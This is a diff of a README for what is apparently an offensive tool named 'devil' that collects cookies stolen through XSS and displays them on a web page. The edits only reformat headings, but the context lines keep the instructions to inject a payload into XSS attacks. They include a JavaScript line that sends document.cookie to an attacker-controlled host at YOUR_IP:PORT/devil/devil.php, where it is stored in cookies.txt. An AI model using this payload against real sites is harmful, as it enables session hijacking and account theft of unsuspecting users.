@@ -5,8 +5,7 @@ A tool to collect cookies and show them in a web page.
 
 ## Documentation 📖
 
-This tool is to collect cookies via logs with XSS, This is how it works:
-
+This tool is to collect cookies via logs with XSS
 
 ### Install requiriments 🔭
 
@@ -25,7 +24,7 @@ php -S localhost:3333
 ~~~
 
 
-## Collecting cookies 🗡️
+### Collecting cookies 🗡️
 
 You need to know how to do XSS Attacks to use this tool in a correct way, you have to add this URL `http://YOUR_IP:PORT/devil/devil.php?i=` to your script and then add the cookies, for example:
 
@@ -36,7 +35,7 @@ new Image().src='http://YOUR_IP:PORT/devil/devil.php?i='+document.cookie;
 Then you will have the cookie in the file `cookies.txt` and it will be displayed in the web page
 
 
-## cleaning cookies 🗑️
+### cleaning cookies 🗑️
 
 To clean cookies you just need to add an space the `cookies.txt` file, you can use this command:
 
